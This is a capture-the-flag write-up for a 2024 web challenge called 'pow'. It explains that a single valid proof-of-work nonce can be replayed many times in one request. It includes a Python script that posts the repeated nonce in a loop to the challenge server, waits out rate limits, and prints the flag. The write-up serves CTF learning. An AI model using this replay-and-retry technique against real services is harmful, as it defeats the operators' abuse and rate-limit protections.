---
title: "Web: pow (easy)"
date: "2024-06-23"
thumbnail: "/assets/img/thumbnail/wani24.png"
---

# Description
---
compute hash to get your flag.

Flag Format: FLAG{...}

# Solution

When we first open the challange we see this
<img src="/assets/img/wani24/capture2.png">
The checking works as a counter and works according to this js script

```js
function hash(input) {
        let result = input;
        for (let i = 0; i < 10; i++) {
          result = CryptoJS.SHA256(result);
        }
        return (result.words[0] & 0xFFFFFF00) === 0;
      }
      async function send(array) {
        document.getElementById("server-response").innerText = await fetch(
          "/api/pow",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(array),
          }
        ).then((r) => r.text());
      }
      let i = BigInt(localStorage.getItem("pow_progress") || "0");
      async function main() {
        await send([]);
        async function loop() {
          document.getElementById(
            "client-status"
          ).innerText = `Checking ${i.toString()}...`;
          localStorage.setItem("pow_progress", i.toString());
          for (let j = 0; j < 1000; j++) {
            i++;
            if (hash(i.toString())) {
              await send([i.toString()]);
            }
          }
          requestAnimationFrame(loop);
        }
        loop();
      }
      main();
```

When the counter reaches a number such that (number & 0xFFFFFF00) === 0
The progress increases by one and also this request will be caught by burp
<img src="/assets/img/wani24/capture3.png">
and when we resend the same request the progress increase as we caught one of the desired numbers
we can also make the array contains the same element multiple times and the progress will increase depending on the occurance of the number, but the array had limit about 50000 after that we get `error invalid body`

Note that in case of too many requests we get `Rate limit reached` and status code 429 in this case we should wait.
Let's make a python script that sends the same request 1000000 times to complete the progress and get the flag

```py
import requests
import json
import logging
import time

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("pow_script.log"),
        logging.StreamHandler()
    ]
)

# Constants
URL = "https://web-pow-lz56g6.wanictf.org/api/pow"
COOKIE = "pow_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiJjNWRiNjU1MC1lNTNlLTRiNjUtYTM3NC05MDUzNjk0YmY2YzgifQ.wOrQhP5rjdXj4VsR1IqBe-HqX3aRXYRiNS_Tt2Y05eA"

# Create the payload
payload = ["82738388"] * 50000  # Max i was able to send without getting the error invalid body, must be an array of strings

# Headers
headers = {
    "Host": "web-pow-lz56g6.wanictf.org",
    "Cookie": COOKIE,
    "Sec-Ch-Ua": '"Chromium";v="15", "Not.A/Brand";v="24"',
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=1, i"
}

def send_data():
    response = requests.post(URL, headers=headers, data=json.dumps(payload))
    return response

def main():
    while True:
        try:
            response = send_data()
            if response.status_code == 200:
                logging.info(f"Data sent successfully. Server response: {response.text}")
            elif response.status_code == 429:
                logging.warning("Rate limit reached. Waiting for 30 seconds.")
                time.sleep(30)  # Wait for 30 seconds before retrying
            else:
                logging.error(f"Error sending data: {response.status_code} - {response.text}")
        except Exception as e:
            logging.error(f"Exception occurred: {str(e)}")

if __name__ == "__main__":
    main()
```

and here is the output

```
2024-06-23 12:27:29,911 - INFO - Data sent successfully. Server response: progress: 50003 / 1000000
2024-06-23 12:27:33,215 - INFO - Data sent successfully. Server response: progress: 100003 / 1000000
2024-06-23 12:27:44,163 - INFO - Data sent successfully. Server response: progress: 150003 / 1000000
2024-06-23 12:27:47,618 - INFO - Data sent successfully. Server response: progress: 200003 / 1000000
2024-06-23 12:27:54,285 - INFO - Data sent successfully. Server response: progress: 250003 / 1000000
2024-06-23 12:28:01,104 - INFO - Data sent successfully. Server response: progress: 300003 / 1000000
2024-06-23 12:28:06,494 - INFO - Data sent successfully. Server response: progress: 350003 / 1000000
2024-06-23 12:28:10,626 - INFO - Data sent successfully. Server response: progress: 400003 / 1000000
2024-06-23 12:28:20,049 - INFO - Data sent successfully. Server response: progress: 450003 / 1000000
2024-06-23 12:28:26,677 - INFO - Data sent successfully. Server response: progress: 500003 / 1000000
2024-06-23 12:28:33,457 - INFO - Data sent successfully. Server response: progress: 550003 / 1000000
2024-06-23 12:28:38,442 - INFO - Data sent successfully. Server response: progress: 600003 / 1000000
2024-06-23 12:28:46,195 - INFO - Data sent successfully. Server response: progress: 650003 / 1000000
2024-06-23 12:28:52,165 - INFO - Data sent successfully. Server response: progress: 700003 / 1000000
2024-06-23 12:29:00,487 - INFO - Data sent successfully. Server response: progress: 750003 / 1000000
2024-06-23 12:29:05,970 - INFO - Data sent successfully. Server response: progress: 800003 / 1000000
2024-06-23 12:29:10,849 - INFO - Data sent successfully. Server response: progress: 850003 / 1000000
2024-06-23 12:29:16,914 - INFO - Data sent successfully. Server response: progress: 900003 / 1000000
2024-06-23 12:29:22,720 - INFO - Data sent successfully. Server response: progress: 950003 / 1000000
2024-06-23 12:29:24,469 - INFO - Data sent successfully. Server response: FLAG{N0nCE_reusE_i$_FUn}
```

Congratzzzzzzzzzzzzz